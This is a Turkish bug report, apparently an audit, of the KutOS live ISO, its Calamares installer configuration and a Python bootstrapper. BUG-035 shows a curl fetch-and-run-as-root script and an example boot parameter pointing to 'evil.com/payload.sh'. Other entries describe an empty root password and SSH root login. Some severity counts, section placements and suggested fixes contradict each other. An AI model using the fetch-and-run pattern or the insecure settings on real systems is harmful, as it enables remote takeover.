# KutOS — Known Issues & Bug Report

> Analiz tarihi: 2026-06-17  
> Kapsam: Live ISO + Calamares kurulum akışı + kutos-bootstrapper

---

## ÖZET

Projede **üç paralel** kurulum yaklaşımı var ve birbirleriyle çelişiyor:
1. **Eski yaklaşım**: Calamares'i doğrudan başlat (autostart ile)
2. **Orta yaklaşım**: kutos-bootstrapper → GitHub'dan Python installer clone'la → özel installer'ı başlat
3. **Yeni/planlanan**: Go + GTK3 installer — backend var ama UI ve main.go yazılmamış (BUG-020, BUG-025)

Bu üç yaklaşım aynı anda repoda bulunuyor ve birbirini kırıyor. Ayrıca build sistemi hardcoded kullanıcı yolları (BUG-019, BUG-027), güvenlik açıkları (BUG-021, BUG-022), ve Calamares yapılandırma hataları (BUG-002, BUG-007) mevcut.

Toplam **35** bug tespit edildi: 7 kritik, 14 yüksek, 10 orta, 4 düşük.

---

## KRİTİK (Kurulum başlamaz / çöker)

### BUG-001: `kutos-bootstrapper` executable değil — `profiledef.sh`'de izin tanımlanmamış

**Dosya:** `profiledef.sh`

`file_permissions` listesi şu satırı **içermiyor:**
```
["/usr/local/bin/kutos-bootstrapper"]="0:0:755"
```

Mevcut liste sadece şunları içeriyor:
- `kutos-installer` → 755 ✓
- `kutos-settings` → 755 ✓
- `kutos-bootstrapper` → **YOK** ✗

ISO build edilince `kutos-bootstrapper` binary'si çalıştırılabilir olmayacak.  
Root Desktop'taki kısayol (`pkexec /usr/local/bin/kutos-bootstrapper`) **permission denied** hatası verir.

**Düzeltme:**
```bash
["/usr/local/bin/kutos-bootstrapper"]="0:0:755"
```
`profiledef.sh` `file_permissions` bloğuna ekle.

---

### BUG-002: Calamares exec sequence'de config dosyası olmayan modüller var

**Dosya:** `airootfs/etc/calamares/settings.conf`

`exec:` bölümünde şu modüller çağrılıyor ama `modules/` dizininde **karşılık gelen `.conf` dosyaları yok:**

| Modül | Config Dosyası | Durum |
|---|---|---|
| `machineid` | `modules/machineid.conf` | ❌ Yok |
| `localecfg` | `modules/localecfg.conf` | ❌ Yok |
| `luksbootkeyfile` | `modules/luksbootkeyfile.conf` | ❌ Yok |
| `hwclock` | `modules/hwclock.conf` | ❌ Yok |
| `services-systemd` | `modules/services-systemd.conf` | ❌ Yok |

Bu modüller Calamares default değerlerle çalışmayı deneyebilir ama `services-systemd` ve `luksbootkeyfile` özellikle yapılandırma gerektiriyor. Kurulum sırasında Calamares bu modüllerde hata verip duracak.

**Düzeltme:** Her modül için minimal config dosyası oluştur veya settings.conf'dan kaldır.

---

### BUG-003: Bootstrapper GitHub repo URL'si yanlış (org adı hatalı)

**Dosya:** `airootfs/usr/local/lib/kutos-bootstrapper/main.py`, satır 12

```python
REPO_URL = "https://github.com/kutsos/kutos-installer"
```

Proje genelinde organizasyon adı `kutos` veya `kutos-linux` olarak geçiyor (`branding.desc`, README, `profiledef.sh`). `kutsos` → **typo**, muhtemelen bu repo var olmayan bir URL.

`git clone` başarısız olursa bootstrapper `_show_error()` gösteriyor ama kullanıcı internet olmasına rağmen kurulumu başlatamıyor.

**Düzeltme:** URL'yi doğru GitHub org/repo ile güncelle.

---

### BUG-004: `/usr/local/bin/kutos-installer` var olmayan bir path çağırıyor

**Dosya:** `airootfs/usr/local/bin/kutos-installer`

```bash
exec python3 /usr/local/lib/kutos-installer/main.py "$@"
```

`/usr/local/lib/kutos-installer/` dizini **projede yok.** Bu binary direkt çalıştırılırsa hata verir.  
Bootstrapper bunu kullanmıyor (kendi clone ettiği `/tmp/kutos-installer/main.py`'i çalıştırıyor), ama karışıklık yaratıyor ve bu binary ölü kod.

---

## YÜKSEK (Kurulumda büyük sorun çıkarır)

### BUG-005: Desktop kısayolları birbiriyle çelişiyor — üç farklı yere farklı şey yazılmış

**İlgili dosyalar:**

| Dosya | Exec | Amaç |
|---|---|---|
| `airootfs/root/Desktop/kutos-installer.desktop` | `pkexec /usr/local/bin/kutos-bootstrapper` | Bootstrapper başlat |
| `airootfs/root/.config/autostart/kutos-installer.desktop` | `pkexec calamares` | Calamares başlat (autostart) |
| `airootfs/etc/skel/Desktop/kutos-installer.desktop` | `pkexec calamares` | Calamares başlat |

**Sorun:**
- Live ortam açılınca **autostart** Calamares'i çalıştırıyor, bootstrapper'ı değil.
- Root masaüstündeki kısayol bootstrapper'ı çalıştırıyor (ama BUG-001 yüzünden çalışmıyor).
- Skel Desktop kısayolu (normal kullanıcılar için) Calamares'i çalıştırıyor.
- `shellprocess.conf` kurulum sonrası bu skel kısayolunu kullanıcı ev dizinine kopyalıyor, yani **kurulu sisteme de Calamares kısayolu gidiyor** (kurulu sistemde Calamares olmayacak).

**Düzeltme:** Hangi installer kullanılacağına karar ver ve tüm kısayolları tek bir hedefe çek. Autostart da aynı hedefi göstermeli.

---

### BUG-006: `_patch_installer()` — dinamik kod enjeksiyonu her zaman başarısız

**Dosya:** `airootfs/usr/local/lib/kutos-bootstrapper/main.py`, satır 120-139

```python
target_file = os.path.join(INSTALLER_PATH, "backend/installer.py")
if not os.path.exists(target_file):
    target_file = os.path.join(INSTALLER_PATH, "backend/config.py")

if os.path.exists(target_file):
    # kod enjekte et
```

Bu patch, `backend/installer.py` veya `backend/config.py` dosyalarından birinin var olmasına bağlı. İndirilen repo'nun yapısı bilinmiyorsa (ve BUG-003 ile clone zaten başarısız oluyorsa) **kutos-settings hiçbir zaman kurulu sisteme kopyalanmayacak.**

Ayrıca bu yaklaşım: indirilmiş bir binary'e runtime'da kod enjekte etmek, güvenlik açısından kötü bir pratik.

---

### BUG-007: `networkcfg.conf` neredeyse boş — ağ konfigürasyonu aktarılmıyor

**Dosya:** `airootfs/etc/calamares/modules/networkcfg.conf`

```yaml
# Copy network configuration from live environment to installed system
```

Sadece yorum satırı var, gerçek config yok. Calamares `networkcfg` modülü en azından `networkmanager: true` gibi bir direktif bekliyor. Kurulu sisteme ağ konfigürasyonu aktarılmayacak. Kullanıcı kurulum sonrası ağa bağlanamayabilir.

---

### BUG-008: `selected_ssid` AttributeError riski — NetworkSetupPage

**Dosya:** `airootfs/usr/local/lib/kutos-bootstrapper/network_setup.py`, satır 101-108

```python
def _on_connect_clicked(self, btn):
    if not self.selected_ssid:  # ← AttributeError burada!
```

`self.selected_ssid` sadece `_on_row_activated` içinde set ediliyor. Eğer "Connect" butonuna bir ağ seçilmeden tıklanırsa (teorik olarak mümkün değil çünkü `set_sensitive(False)`, ama bir race condition veya programatik çağrı durumunda) `AttributeError` fırlatır.

**Düzeltme:** `__init__`'te `self.selected_ssid = None` ekle.

---

### BUG-009: WiFi bağlantı hatası kullanıcıya gösterilmiyor

**Dosya:** `airootfs/usr/local/lib/kutos-bootstrapper/network_setup.py`, satır 133-144

```python
except Exception as e:
    print(f"Connection failed: {e}")  # sadece terminale basılıyor
```

Bağlantı başarısız olursa kullanıcı arayüzde hiç bir şey göremiyor. UI "bağlanıyor..." gibi görünmeye devam edebilir. `GLib.idle_add` ile hata callback'i UI'a geri taşınmalı.

---

## ORTA (Potansiyel sorunlar)

### BUG-010: `packages.conf` kurulum sırasında internet gerektiriyor

**Dosya:** `airootfs/etc/calamares/modules/packages.conf`

```yaml
operations:
  - install:
      - firefox
      - networkmanager
      ...
```

Bu paketler kurulum sırasında pacman ile **internet üzerinden** indirilecek. İnternetsiz kurulumda veya yavaş bağlantıda kurulum takılacak/başarısız olacak.

Firefox zaten live ortamda `packages.x86_64` ile dahil ediliyor — squashfs imajından kurulum sonrası tekrar `packages.conf` ile indirmeye gerek yok.

---

### BUG-011: `packages.x86_64` içinde `xorg-xinit` iki kez tanımlı

**Dosya:** `packages.x86_64`, satır 98 ve 103

```
xorg-xinit   # satır 98
...
xorg-xinit   # satır 103 (tekrar)
```

Build sırasında uyarı verir, paket sadece bir kez kurulur ama yine de temizlenmeli.

---

### BUG-012: `bootloader.conf` — `efiRunDirectory` non-standard path

**Dosya:** `airootfs/etc/calamares/modules/bootloader.conf`

```yaml
efiRunDirectory: "/run/efi"
```

Standart Calamares konfigürasyonunda bu path genellikle `/run/mnt/usr/share/efi` veya boş bırakılır. `/run/efi` live ortamda mount edilmiş EFI partition'ı değil. GRUB kurulumu başarısız olabilir.

---

### BUG-013: Python `__pycache__` dosyaları repo'ya dahil — cpython-314 bytecode

**İlgili dizinler:**
- `airootfs/usr/local/lib/kutos-bootstrapper/__pycache__/`
- `airootfs/usr/local/lib/kutos-settings/pages/__pycache__/`
- vb.

cpython-314 bytecode ISO'ya dahil edilmiş. ISO'da farklı bir Python sürümü kullanılıyorsa bytecode ignore edilecek ve Python her seferinde yeniden derleyecek (küçük performans etkisi). Daha büyük sorun: bu dosyalar `.gitignore`'a eklenmeli.

---

### BUG-014: `branding.desc` URL'leri var olmayan GitHub org'u gösteriyor

**Dosya:** `airootfs/etc/calamares/branding/kutos/branding.desc`

```yaml
productUrl:      "https://github.com/kutos-linux"
supportUrl:      "https://github.com/kutos-linux/issues"
knownIssuesUrl:  "https://github.com/kutos-linux/issues"
releaseNotesUrl: "https://github.com/kutos-linux/releases"
```

Bu URL'ler Calamares welcome ekranında gösterilecek. Eğer `kutos-linux` GitHub org'u yoksa tüm linkler 404 verecek.

---

### BUG-015: `shellprocess.conf` kurulum sonrası kısayol kopyalaması yanlış target kopyalıyor

**Dosya:** `airootfs/etc/calamares/modules/shellprocess.conf`, satır 19-29

```bash
cp /etc/skel/Desktop/*.desktop "${user_home}Desktop/"
```

`/etc/skel/Desktop/kutos-installer.desktop` dosyası `Exec=pkexec calamares` içeriyor. Calamares kurulu sistemde **olmayacak**, bu yüzden bu kısayol kurulu sistemde çalışmayacak (ya hata verecek ya da hiç bir şey yapmayacak).

---

## DÜŞÜK / BİLGİ

### BUG-016: `locale.conf` GeoIP desteği yok — hardcoded Europe/Istanbul

**Dosya:** `airootfs/etc/calamares/modules/locale.conf`

```yaml
region: "Europe"
zone:   "Istanbul"
geoip:
    style: "none"
```

Farklı ülkelerden kullanıcılar için her zaman Istanbul seçili başlayacak. Calamares'te GeoIP ile otomatik locale tespiti yapılabilir.

---

### BUG-017: `welcome.conf` internet kontrolü check listesinde yok

**Dosya:** `airootfs/etc/calamares/modules/welcome.conf`

```yaml
check:
    - storage
    - ram
    - root
required:
    - storage
    - ram
    - root
```

`internet` check yok. Eğer kurulum sırasında `packages.conf` (BUG-010) internet gerektiriyorsa, kullanıcıyı internet bağlantısı olmadan içeri almak sorunlara yol açar.

---

### BUG-018: `lightdm.conf` — `autologin-session=xfce` ama oturum adı `xfce4` olmalı

**Dosya:** `airootfs/etc/lightdm/lightdm.conf`

```ini
autologin-session=xfce
user-session=xfce
```

XFCE oturum adı genellikle `xfce` veya `xfce4` olarak kayıtlıdır (dağıtıma göre). Eğer `/usr/share/xsessions/xfce4.desktop` varsa ve `xfce.desktop` yoksa otomatik giriş başarısız olur ve greeter ekrana gelir. `startxfce4` executable olduğuna göre `xfce4` olması daha güvenli.

---

### BUG-019: `pacman.conf` içinde hardcoded kullanıcı yolu — build başka makinede başarısız

**Dosya:** `pacman.conf`, satır 100

```ini
Server = file:///home/bugrapc/KutOs/localrepo
```

Bu path sadece `bugrapc` kullanıcısının makinesinde geçerli. Başka bir geliştirici veya CI ortamında `mkarchiso` çalıştırıldığında `[kutos-local]` reposu bulunamaz ve `calamares`/`ckbcomp` paketleri kurulamaz.

**Düzeltme:** `build_calamares.sh` veya `build.sh` tarafından dinamik olarak `SCRIPT_DIR` kullanarak `Server = file://${SCRIPT_DIR}/localrepo` yazılmalı.

---

### BUG-020: Go installer derlenemez durumda — `main.go` ve UI yok

**Dosya:** `kutos-installer-src/`

Mevcut durum:
- `config/config.go` ✓ (var)
- `backend/disk.go` ✓ (var)
- `backend/install.go` ✓ (var)
- `backend/locale.go` ✓ (var)
- `backend/keyboard.go` ✓ (var)
- `main.go` **✗ (yok)**
- `ui/` dizini **tamamen boş** — `window.go`, `style.go`, `pages/*.go` yazılmamış

`go.mod` var ama modül derlenemiyor çünkü entry point yok. Plan dokümanı (`docs/superpowers/plans/2026-06-17-go-installer.md`) 2464 satır detaylı kod içeriyor ama bunlar hiç yazılmamış.

**Düzeltme:** Planı uygulayarak kalan dosyaları yaz veya Go installer çalışmasını şimdilik rafa kaldır.

---

### BUG-021: Root şifresi boş — live ISO'da güvenlik açığı

**Dosya:** `airootfs/etc/shadow`

```
root::14871::::::
```

İkinci alan (şifre hash'i) boş. Bu, root hesabına şifresiz giriş yapılabileceği anlamına gelir. Arch ISO'larında bu standarttır fakat live ortamda SSH açıksa (BUG-022) ciddi bir güvenlik riski oluşturur.

---

### BUG-022: SSH üzerinden root girişi ve parola doğrulaması açık

**Dosya:** `airootfs/etc/ssh/sshd_config.d/10-archiso.conf`

```ini
PasswordAuthentication yes
PermitRootLogin yes
```

Live ISO üzerinde SSH sunucusu çalışıyorsa, root şifresinin boş olmasıyla (BUG-021) birleşince ağ üzerinden herkes root erişimi kazanabilir. Arch ISO standartlarında SSH genelde kapalıdır veya sadece key-based auth ile sınırlıdır.

**Düzeltme:** `PasswordAuthentication no` ve `PermitRootLogin prohibit-password` yap veya SSH servisini tamamen kaldır.

---

### BUG-023: `SigLevel = Optional TrustAll` — yerel AUR paketleri imzasız

**Dosya:** `pacman.conf`, satır 98-99

```ini
[kutos-local]
SigLevel = Optional TrustAll
```

`build_calamares.sh` ile AUR'dan derlenen `calamares` ve `ckbcomp` paketleri hiçbir imza doğrulaması olmadan kuruluyor. AUR'dan gelen paketler man-in-the-middle veya repo compromise durumunda zararlı kod içerebilir.

**Düzeltme:** En azından `SigLevel = Never` yerine paket checksum'larını doğrula veya paketleri `makepkg` imzasıyla imzala.

---

### BUG-024: LightDM greeter olmayan bir logo dosyasına referans veriyor

**Dosya:** `airootfs/etc/lightdm/lightdm-gtk-greeter.conf`, satır 6

```ini
default-user-image=/usr/share/pixmaps/kutos-logo.png
```

Projede `kutos-logo.png` dosyası sadece Calamares branding dizininde (`branding/kutos/logo.png`) bulunuyor. `/usr/share/pixmaps/kutos-logo.png` path'inde herhangi bir dosya tanımlanmamış. LightDM greeter'da varsayılan kullanıcı resmi kırık gösterilecek.

**Düzeltme:** Logo dosyasını `/usr/share/pixmaps/` altına da kopyalayacak bir adım ekle veya var olan bir ikonu referans ver.

---

### BUG-025: Go installer planı ile mevcut kod arasında büyük tutarsızlık

**Dosya:** `docs/superpowers/plans/2026-06-17-go-installer.md` vs `kutos-installer-src/`

Plan şunları içeriyor:
- 8 adet UI sayfası (`welcome.go`, `locale.go`, `keyboard.go`, `partition.go`, `users.go`, `summary.go`, `progress.go`, `finish.go`)
- Ana pencere (`window.go`) ve CSS (`style.go`)
- Entry point (`main.go`)
- 6 task'a bölünmüş 2464 satırlık detaylı kod

Gerçekte yazılmış olanlar:
- Sadece `config/` ve `backend/` paketleri
- `ui/` dizini tamamen boş
- `main.go` yok

Plan ile gerçeklik arasında 5 tasklık (~2000+ satır) bir boşluk var.

---

### BUG-026: kutos-settings indirme URL'leri var olmayan GitHub organizasyonuna işaret ediyor

**Dosya:** `airootfs/usr/local/lib/kutos-settings/pages/desktop_env.py`, satır 12-17

```python
DE_CONFIGS = {
    "XFCE": "https://github.com/kutos-linux/configs/raw/main/xfce.tar.gz",
    "KDE": "https://github.com/kutos-linux/configs/raw/main/kde.tar.gz",
    "GNOME": "https://github.com/kutos-linux/configs/raw/main/gnome.tar.gz",
    "Hyprland": "https://github.com/kutos-linux/configs/raw/main/hyprland.tar.gz",
}
```

`kutos-linux` organizasyonu altında `configs` reposu var mı bilinmiyor. Eğer yoksa (BUG-014'teki gibi) kutos-settings içindeki "Desktop Environment" sayfasında tüm indirme işlemleri başarısız olacak.

---

### BUG-027: `test_installer.sh` hardcoded kullanıcı yolu içeriyor

**Dosya:** `test_installer.sh`

```bash
export PYTHONPATH="/home/bugrapc/KutOs/airootfs/usr/local/lib/kutos-bootstrapper:$PYTHONPATH"
python3 /home/bugrapc/KutOs/airootfs/usr/local/lib/kutos-bootstrapper/main.py
```

Script sadece `bugrapc` kullanıcısının makinesinde çalışır. `test_setting.sh` ise `$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)` kullanarak dinamik path çözümlediği için taşınabilir.

**Düzeltme:** `test_installer.sh`'i `test_setting.sh` ile aynı dinamik path yaklaşımına çevir.

---

### BUG-028: Boş üst düzey dizinler repoya commit edilmiş

**Dizinler:** `calamares/`, `ckbcomp/`

Bu iki dizin tamamen boş. `build_calamares.sh` geçici olarak `/tmp` altında çalışıyor, bu dizinleri kullanmıyor. `git` boş dizinleri takip etmediği için buralara bilinçli olarak `.gitkeep` konulmadıkça commit edilemezler — dolayısıyla aslında repoda görünmüyor olabilirler. Yine de gereksiz yapısal kalıntı.

---

### BUG-029: `.gitignore` eksik — bytecode ve build artifact'ları ignore edilmiyor

**Dosya:** `.gitignore`

```gitignore
/out
.claude
```

Eksik olanlar:
- `__pycache__/`
- `*.pyc`, `*.pyo`
- `localrepo/*.pkg.tar.zst` (bunlar binary build artifact'ı)
- `localrepo/kutos-local.db*` ve `localrepo/kutos-local.files*`
- `/tmp/` geçici dosyalar

Sonuç: cpython-314 bytecode dosyaları (BUG-013 ile aynı kök neden) repoya dahil olmuş.

---

### BUG-030: ISO sürümü dinamik tarih olduğu için reproducible build imkansız

**Dosya:** `profiledef.sh`, satır 8

```bash
iso_version="$(date --date="@${SOURCE_DATE_EPOCH:-$(date +%s)}" +%Y.%m.%d)"
```

Her build'de ISO sürüm numarası otomatik değişir. Aynı kaynak koddan aynı ISO hash'ini elde etmek (reproducible build) imkansız.

**Düzeltme:** `SOURCE_DATE_EPOCH` environment variable ile override edilebilir yap veya sürümü sabit bir değere (örn: Git tag) bağla.

---

### BUG-031: Firefox ve NetworkManager çift paket — hem squashfs hem online kurulum

**Dosyalar:** `packages.x86_64` (satır 40, 144) ve `packages.conf`

`packages.x86_64` (squashfs imajına dahil edilen paketler):
- `networkmanager` (satır 40)
- `firefox` (satır 144)

`packages.conf` (Calamares online kurulumda pacman ile indirilen paketler):
- `networkmanager`
- `firefox`

Bu paketler hem live ISO squashfs'inde mevcut hem de kurulum sırasında tekrar pacman ile indirilmeye çalışılıyor. Gereksiz bant genişliği kullanımı ve potansiyel sürüm çakışması.

---

### BUG-032: branding sürüm bilgisi sabit, profiledef dinamik — tutarsız

**Dosyalar:** `branding.desc` (satır 9) ve `profiledef.sh` (satır 8)

- `branding.desc`: `version: "2025.1"` (sabit)
- `profiledef.sh`: `iso_version="$(date ... +%Y.%m.%d)"` (her build'de farklı)

Calamares welcome ekranında "KutOS 2025.1" yazarken ISO dosya adı bugünün tarihini taşıyacak. Sürüm tutarsızlığı kafa karıştırıcı.

**Düzeltme:** İkisini de aynı kaynaktan (örn: Git tag veya sabit bir değişken) besle.

---

### BUG-033: Go installer Türkçe varsayılanlarla hardcoded

**Dosya:** `kutos-installer-src/config/config.go`, satır 31-39

```go
func New() *InstallConfig {
    return &InstallConfig{
        Filesystem:     "ext4",
        SwapSize:       "none",
        Timezone:       "Europe/Istanbul",
        Locale:         "tr_TR.UTF-8",
        KeyboardLayout: "tr",
        InstallGRUB:    true,
    }
}
```

Tüm varsayılanlar Türkçe. Farklı ülkelerden kullanıcılar için her seferinde locale/keyboard/timezone değiştirmek gerekecek. GeoIP veya live ortamdan otomatik tespit yapılmalı.

---

### BUG-034: `shellprocess.conf`'ta gereksiz `chmod` — zaten profiledef.sh'te ayarlı

**Dosya:** `airootfs/etc/calamares/modules/shellprocess.conf`, satır 16

```yaml
- command: "chmod +x /usr/local/bin/kutos-settings"
  timeout: 10
```

`profiledef.sh` zaten şu izni tanımlıyor:
```bash
["/usr/local/bin/kutos-settings"]="0:0:755"
```

Bu `chmod` komutu gereksiz. Ancak zararsız — sadece temizlenebilir.

---

### BUG-035: `.automated_script.sh` kernel cmdline üzerinden rastgele script çalıştırır

**Dosya:** `airootfs/root/.automated_script.sh`

```bash
script="$(script_cmdline)"  # /proc/cmdline'dan script= parametresini okur
curl "${script}" --location ... -o /tmp/startup_script  # HTTP(S) üzerinden indirir
chmod +x /tmp/startup_script
/tmp/startup_script  # root olarak çalıştırır
```

Bootloader'a `script=https://evil.com/payload.sh` parametresi eklenirse, ISO boot edildiğinde rastgele kod root yetkisiyle çalışır. Bu Arch ISO'larında standart bir özellik olsa da, farkında olunması gereken bir güvenlik riskidir. Özellikle PXE/netboot senaryolarında tehlikeli.

---

## ÖZET TABLO

| ID | Öncelik | Başlık | Durum |
|---|---|---|---|
| BUG-001 | 🔴 Kritik | kutos-bootstrapper çalıştırma izni yok | Açık |
| BUG-002 | 🔴 Kritik | Calamares'te config'siz modüller var | Açık |
| BUG-003 | 🔴 Kritik | Bootstrapper clone URL'si yanlış (kutsos typo) | Açık |
| BUG-004 | 🔴 Kritik | kutos-installer binary bozuk path çağırıyor | Açık |
| BUG-005 | 🟠 Yüksek | Desktop kısayolları birbirleriyle çelişiyor | Açık |
| BUG-006 | 🟠 Yüksek | `_patch_installer()` her zaman başarısız | Açık |
| BUG-007 | 🟠 Yüksek | `networkcfg.conf` boş — ağ aktarılmıyor | Açık |
| BUG-008 | 🟠 Yüksek | `selected_ssid` AttributeError riski | Açık |
| BUG-009 | 🟠 Yüksek | WiFi hataları UI'a yansıtılmıyor | Açık |
| BUG-010 | 🟡 Orta | packages.conf internet gerektirir | Açık |
| BUG-011 | 🟡 Orta | xorg-xinit çift tanımlı | Açık |
| BUG-012 | 🟡 Orta | `efiRunDirectory` non-standard | Açık |
| BUG-013 | 🟡 Orta | __pycache__ repo'ya dahil | Açık |
| BUG-014 | 🟡 Orta | branding URL'leri yanlış | Açık |
| BUG-015 | 🟡 Orta | Kurulum sonrası kısayol Calamares'i çağırıyor | Açık |
| BUG-016 | 🔵 Düşük | GeoIP yok, hardcoded Istanbul | Açık |
| BUG-017 | 🔵 Düşük | welcome.conf internet check yok | Açık |
| BUG-018 | 🔵 Düşük | lightdm oturum adı uyumsuz olabilir | Açık |
| BUG-019 | 🔴 Kritik | `pacman.conf` hardcoded user-specific localrepo path — build başka makinede başarısız | Açık |
| BUG-020 | 🔴 Kritik | Go installer `kutos-installer-src/` main.go yok, ui/ boş — derlenemez | Açık |
| BUG-021 | 🔴 Kritik | `/etc/shadow` root şifresi boş — live ISO güvenlik riski | Açık |
| BUG-022 | 🔴 Kritik | SSH root login ve password auth açık — live ISO güvenlik riski | Açık |
| BUG-023 | 🟠 Yüksek | `pacman.conf` `SigLevel = Optional TrustAll` — AUR paket imza doğrulaması yok | Açık |
| BUG-024 | 🟠 Yüksek | `lightdm-gtk-greeter.conf` olmayan `/usr/share/pixmaps/kutos-logo.png` referansı | Açık |
| BUG-025 | 🟠 Yüksek | Go installer plan (2464 satır) ile mevcut kod tutarsız — sadece backend var | Açık |
| BUG-026 | 🟠 Yüksek | `desktop_env.py` var olmayan `github.com/kutos-linux/configs` reposundan dosya indiriyor | Açık |
| BUG-027 | 🟠 Yüksek | `test_installer.sh` hardcoded `/home/bugrapc/KutOs/` path — başka makinede çalışmaz | Açık |
| BUG-028 | 🟡 Orta | Boş üst düzey dizinler (`calamares/`, `ckbcomp/`) repoya commit edilmiş | Açık |
| BUG-029 | 🟡 Orta | `.gitignore` çok kısa — `__pycache__/`, `*.pyc`, `localrepo/*.pkg.*` eksik | Açık |
| BUG-030 | 🟡 Orta | `profiledef.sh` `iso_version` dinamik tarih kullanıyor — reproducible build imkansız | Açık |
| BUG-031 | 🟡 Orta | Firefox ve NetworkManager hem `packages.x86_64` hem `packages.conf`'da — çift kurulum | Açık |
| BUG-032 | 🟡 Orta | `branding.desc` version "2025.1" sabit vs `profiledef.sh` dinamik tarih — uyumsuz | Açık |
| BUG-033 | 🟡 Orta | Go `config.go` Türkçe varsayılanlar (Istanbul, tr_TR, tr klavye) hardcoded | Açık |
| BUG-034 | 🔵 Düşük | `shellprocess.conf` gereksiz `chmod +x kutos-settings` (zaten profiledef.sh'te 755) | Açık |
| BUG-035 | 🔵 Düşük | `.automated_script.sh` kernel cmdline üzerinden rastgele script çalıştırmaya izin veriyor | Açık |
